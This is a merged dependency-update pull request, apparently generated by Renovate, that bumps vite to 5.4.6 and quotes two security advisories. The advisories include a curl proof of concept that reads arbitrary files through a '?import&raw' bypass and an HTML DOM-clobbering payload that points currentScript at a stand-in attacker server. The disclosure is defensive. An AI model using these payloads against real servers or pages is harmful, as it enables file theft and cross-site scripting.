```yaml
number: 13385
title: Update dependency vite to v5.4.6
type: pull_request
state: merged
author: renovate
labels:
  - internal
assignees: []
merged: true
base: main
head: renovate/npm-vite-vulnerability
created_at: 2024-09-17T21:20:27Z
updated_at: 2024-09-18T06:25:52Z
url: https://github.com/astral-sh/ruff/pull/13385
synced_at: 2026-01-12T15:55:44Z
```

# Update dependency vite to v5.4.6

---

_@renovate_

This PR contains the following updates:

| Package | Change | Age | Adoption | Passing | Confidence |
|---|---|---|---|---|---|
| [vite](https://vitejs.dev) ([source](https://redirect.github.com/vitejs/vite/tree/HEAD/packages/vite)) | [`5.4.5` -> `5.4.6`](https://renovatebot.com/diffs/npm/vite/5.4.5/5.4.6) | [![age](https://developer.mend.io/api/mc/badges/age/npm/vite/5.4.6?slim=true)](https://docs.renovatebot.com/merge-confidence/) | [![adoption](https://developer.mend.io/api/mc/badges/adoption/npm/vite/5.4.6?slim=true)](https://docs.renovatebot.com/merge-confidence/) | [![passing](https://developer.mend.io/api/mc/badges/compatibility/npm/vite/5.4.5/5.4.6?slim=true)](https://docs.renovatebot.com/merge-confidence/) | [![confidence](https://developer.mend.io/api/mc/badges/confidence/npm/vite/5.4.5/5.4.6?slim=true)](https://docs.renovatebot.com/merge-confidence/) |

### GitHub Vulnerability Alerts

#### [CVE-2024-45811](https://redirect.github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx)

### Summary
The contents of arbitrary files can be returned to the browser.

### Details
`@fs` denies access to files outside of Vite serving allow list. Adding `?import&raw` to the URL bypasses this limitation and returns the file content if it exists.

### PoC
```sh
$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" > /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@&#8203;fs/tmp/secret.txt"

    <body>
      <h1>403 Restricted</h1>
      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@&#8203;fs/tmp/secret.txt?import&raw"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
```

#### [CVE-2024-45812](https://redirect.github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3)

### Summary

We discovered a DOM Clobbering vulnerability in Vite when building scripts to `cjs`/`iife`/`umd` output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.

Note that, we have identified similar security issues in Webpack: https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986

### Details

**Backgrounds**

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] https://scnps.co/papers/sp23_domclob.pdf
[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/

**Gadgets found in Vite**

We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`.

However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.

```
const relativeUrlMechanisms = {
  amd: (relativePath) => {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) => `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) => getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) => getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) => getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) => `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
```

### PoC

Considering a website that contains the following `main.js` script, the devloper decides to use the Vite to bundle up the program with the following configuration. 

```
// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
```

```
// extra.js
export default "https://myserver/justAnOther.js"
```

```
// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
```

After running the build command, the developer will get following bundle as the output.

```
// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document>"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&&document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
```

Adding the Vite bundled script, `dist/index-DDmIg9VD.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.

```
<!DOCTYPE html>
<html>
<head>
  <title>Vite Example</title>
  <!-- Attacker-controlled Script-less HTML Element starts--!>
  <img name="currentScript" src="https://attacker.controlled.server/"></img>
  <!-- Attacker-controlled Script-less HTML Element ends--!>
</head>
<script type="module" crossorigin src="/assets/index-DDmIg9VD.js"></script>
<body>
</body>
</html>
```

### Impact

This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.

### Patch

```
// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =>
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`,
  )
```

---

### Release Notes

<details>
<summary>vitejs/vite (vite)</summary>

### [`v5.4.6`](https://redirect.github.com/vitejs/vite/releases/tag/v5.4.6)

[Compare Source](https://redirect.github.com/vitejs/vite/compare/v5.4.5...v5.4.6)

Please refer to [CHANGELOG.md](https://redirect.github.com/vitejs/vite/blob/v5.4.6/packages/vite/CHANGELOG.md) for details.

</details>

---

### Configuration

📅 **Schedule**: Branch creation - "" (UTC), Automerge - At any time (no schedule defined).

🚦 **Automerge**: Disabled by config. Please merge this manually once you are satisfied.

♻ **Rebasing**: Whenever PR becomes conflicted, or you tick the rebase/retry checkbox.

🔕 **Ignore**: Close this PR and you won't be reminded about this update again.

---

 - [ ] <!-- rebase-check -->If you want to rebase/retry this PR, check this box

---

This PR was generated by [Mend Renovate](https://mend.io/renovate/). View the [repository job log](https://developer.mend.io/github/astral-sh/ruff).
<!--renovate-debug:eyJjcmVhdGVkSW5WZXIiOiIzOC44MC4wIiwidXBkYXRlZEluVmVyIjoiMzguODAuMCIsInRhcmdldEJyYW5jaCI6Im1haW4iLCJsYWJlbHMiOlsiaW50ZXJuYWwiLCJzZWN1cml0eSJdfQ==-->


---

_Label `internal` added by @renovate[bot] on 2024-09-17 21:20_

---

_Label `security` added by @renovate[bot] on 2024-09-17 21:20_

---

_Label `security` removed by @MichaReiser on 2024-09-18 06:25_

---

_Merged by @MichaReiser on 2024-09-18 06:25_

---

_Closed by @MichaReiser on 2024-09-18 06:25_

---

_Branch deleted on 2024-09-18 06:25_

---
